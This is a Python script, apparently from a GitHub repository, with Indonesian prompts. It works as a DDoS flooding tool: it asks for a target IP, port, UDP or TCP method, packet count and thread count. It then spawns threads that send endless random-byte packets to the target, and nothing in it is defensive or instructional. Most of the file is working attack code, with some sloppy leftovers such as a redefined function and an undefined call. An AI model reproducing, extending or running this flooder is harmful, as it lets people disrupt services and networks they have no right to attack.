import signal
import time
import socket
import random
import threading
import sys
import os
from os import system, name

print("\033[1;34;40m \n")
os.system("figlet DDOS ATTACK -f slant")
print("\033[1;33;40mJika Anda memiliki masalah, Hubugi Admin Github Nih https://github.com/UziWatzen/Python-UDP-Flood/\n")

print("\033[1;32;40m ==> [ DDOS UZI WATZEN ] <==  \n")
test = input()
if test == "n":
	exit(0)
os.system("clear")
print("""
\033[91m██████╗░░█████╗░████████╗███╗░░██╗███████╗████████╗
\033[0m██╔══██╗██╔══██╗╚══██╔══╝████╗░██║██╔════╝╚══██╔══╝
\033[91m██████╦╝██║░░██║░░░██║░░░██╔██╗██║█████╗░░░░░██║░░░
\033[0m██╔══██╗██║░░██║░░░██║░░░██║╚████║██╔══╝░░░░░██║░░░
\033[91m██████╦╝╚█████╔╝░░░██║░░░██║░╚███║███████╗░░░██║░░░
\033[0m╚═════╝░░╚════╝░░░░╚═╝░░░╚═╝░░╚══╝╚══════╝░░░╚═╝░░░

\033[88m██╗░░░██╗███████╗██╗
\033[0m██║░░░██║╚════██║██║
\033[88m██║░░░██║░░███╔═╝██║
\033[0m██║░░░██║██╔══╝░░██║
\033[88m╚██████╔╝███████╗██║
\033[0m░╚═════╝░╚══════╝╚═╝
""")

print("\033[31m━━━[ • ] Masukan Nama Anda")
name = str(input("┗━━━━━━>\033[0m:"))
time.sleep(1)
print("\033[31m━━━[ • ] Masukan Host/IP")
ip = str(input("┗━━━━━━>\033[0m:"))
time.sleep(1)
print("\033[31m━━━[ • ] Masukan Port")
port = int(input("┗━━━━━━>\033[0m:"))
time.sleep(1)
print("\033[31m━━━[ • ] Methode Udp/Tcp")
choice = str(input("┗━━━━━━>\033[0m:"))
time.sleep(1)
print("\033[31m━━━[ • ] Masukan Jumlah Paket")	
times = int(input("┗━━━━━━>\033[0m:"))
time.sleep(1)
print("\033[31m━━━[ • ] Masukan Jumlah Threads")	
threads = int(input("┗━━━━━━>\033[0m:"))
def udp():
  data = random._urandom(1002)
  Az = random.choice(("[•]","[•]","[•]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      addr = (str(ip),int(port))
      for x in range(times):
        s.sendto(data,addr)
        print(Az +" \033[91m =====> Attack Ip Port \033[0m%s:%s!!!"%(ip,port))
    except:
      print("[ • ] \033[91m =====> Attack Ip Port \033[0m%s:%s!!!"%(ip,port))

def tcp():
  data = random._urandom(102489)
  Az = random.choice(("[•]","[•]","[•]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      s.connect((ip,port))
      s.send(data)
      for x in range(times):
        s.send(data)
        print(Az +" \033[91m =====> Attack Ip Port \033[0m%s:%s!!!"%(ip,port))
    except:
      s.close()
      print("[ • ] \033[91m =====> Attack Ip Port \033[0m%s:%s!!!"%(ip,port))

for y in range(threads):
  if choice == 'Udp':
    th = threading.Thread(target = udp)
    th.start()
  elif choice == 'Tcp':
    th = threading.Thread(target = tcp)
    th.start()

def clear():
    if name == 'nt':
        _ = system('cls')
    else:
        _ = system('clear')

def udp():
	clear()
	os.system("figlet Anda Meninggalkan Tuan -f miring")
	sys.exit(130)

def exit_gracefully(signum, frame):
    # mengembalikan Ping Server Orang
    signal.signal(signal.SIGINT, original_sigint)

    try:
        exitc = str(input(" Anda ingin keluar dari bby <3 ?:"))
        if exitc == 'y':

            udp()

    except KeyboardInterrupt:
        print("Ok ok")
        byebye()

    # kembalikan handler keluar yang Dimatikan
    signal.signal(signal.SIGINT, exit_gracefully)

if __name__ == '__main__':
    # Untuk Menyimpan Sinyal Server
    original_sigint = signal.getsignal(signal.SIGINT)
    signal.signal(signal.SIGINT, exit_gracefully)